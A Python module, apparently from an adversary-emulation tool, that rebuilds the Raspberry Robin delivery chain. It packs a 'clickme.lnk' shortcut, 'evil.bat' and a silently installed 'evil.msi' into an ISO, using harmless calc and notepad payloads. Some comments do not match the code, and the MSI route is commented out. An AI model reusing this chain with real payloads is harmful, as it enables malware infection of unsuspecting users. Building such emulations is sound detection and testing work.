from typing import List

from make.lnk.lnk import makeLnk
from make.zip.zip import makeZip
from make.bat.bat import *
from make.rar.rar import makeRar
from make.msi.msi import *
from make.powershell.powershell import *
from make.iso.iso import makeIso

from helpers import *
from model import AceFile, AceRoute


def raspberryrobin(baseUrl) -> List[AceRoute]:
    routes = []
    # LNK -> BAT -> MSIEXEC:downloadDLL -> odbcconf/rundll32:dll

    # cmd.exe /r cmd.exe<bla.usb
    # bla.usb: msiexec /q-I <url>
    # msiexec:
    #  - download
    #  - odbcconf:rundll

    msi = makeMsiFromCmd("cmd.exe /c notepad")
    msiFile = AceFile("evil.msi", msi)

    #msiRoute = AceRoute('/evil.msi', msiFile)
    #routes.append(msiRoute)

    # make sure each line ends with \r\n, or it will not work
    bat = AceBytes(b"calc.exe\r\nmsiexec.exe /q /i evil.msi\r\n")
    batFile = makeAceFile('evil.bat', bat)

    # LNK to powershell.exe to execute DLL
    lnkData: AceBytes = makeLnk(
        name = "clickme.lnk",
        target = "c:\\windows\\system32\\cmd.exe",
        arguments = "/r cmd < evil.bat".format(),
    )
    lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)

    # Pack DLL and LNK into ISO
    container: AceBytes = makeIso(files = [
        batFile,
        lnkFile,
        msiFile,
    ])
    containerFile: AceFile = makeAceFile('test.iso', container)

    return routes
    

